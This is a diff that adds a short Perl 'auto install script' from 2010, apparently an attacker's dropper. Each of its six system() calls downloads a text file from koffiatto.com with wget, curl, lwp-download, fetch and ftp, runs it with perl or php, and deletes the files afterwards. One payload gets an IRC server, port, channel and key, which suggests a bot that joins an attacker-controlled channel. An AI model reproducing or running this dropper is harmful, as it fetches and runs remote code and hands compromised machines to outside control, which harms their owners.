@@ -1,0 +1,17 @@
+################################################################
+#!/usr/bin/perl                                                #
+# Auto install script by SuWunk                                #
+# created: Oktober 2010					       #
+################################################################
+{
+system("wget http://koffiatto.com/koffiatt/ts.txt;lwp-download http://koffiatto.com/koffiatt/ts.txt;curl -O http://koffiatto.com/koffiatt/ts.txt;fetch http://koffiatto.com/koffiatt/ts.txt;ftp http://koffiatto.com/koffiatt/ts.txt;perl ts.txt irc.si.leet.la 7000 mojok KaKuNg;rm -rf *.txt");
+system("wget http://koffiatto.com/koffiatt/ml.txt;lwp-download http://koffiatto.com/koffiatt/ml.txt;curl -O http://koffiatto.com/koffiatt/ml.txt;fetch http://koffiatto.com/koffiatt/ml.txt;ftp http://koffiatto.com/koffiatt/ml.txt;perl ml.txt;rm -rf *.txt");
+system("wget http://koffiatto.com/koffiatt/d.txt;lwp-download http://koffiatto.com/koffiatt/d.txt;curl -O http://koffiatto.com/koffiatt/d.txt;fetch http://koffiatto.com/koffiatt/d.txt;ftp http://koffiatto.com/koffiatt/d.txt;perl d.txt;rm -rf *.txt");
+system("wget http://koffiatto.com/koffiatt/e33.txt;lwp-download http://koffiatto.com/koffiatt/e33.txt;curl -O http://koffiatto.com/koffiatt/e33.txt;fetch http://koffiatto.com/koffiatt/e33.txt;ftp http://koffiatto.com/koffiatt/e33.txt;perl e33.txt;rm -rf *.txt");
+system("wget http://koffiatto.com/koffiatt/ss.txt;lwp-download http://koffiatto.com/koffiatt/ss.txt;curl -O http://koffiatto.com/koffiatt/ss.txt;fetch http://koffiatto.com/koffiatt/ss.txt;ftp http://koffiatto.com/koffiatt/ss.txt;perl ss.txt;rm -rf *.txt");
+system("wget http://koffiatto.com/koffiatt/ajar.txt;lwp-download http://koffiatto.com/koffiatt/ajar.txt;curl -O http://koffiatto.com/koffiatt/ajar.txt;fetch http://koffiatto.com/koffiatt/ajar.txt;ftp http://koffiatto.com/koffiatt/ajar.txt;php ajar.txt;php ajar.txt;php ajar.txt;rm -rf *.txt");
+sleep 1;
+print "install Udah Slesai Boss..!!!";
+}
+ 
+################################################################
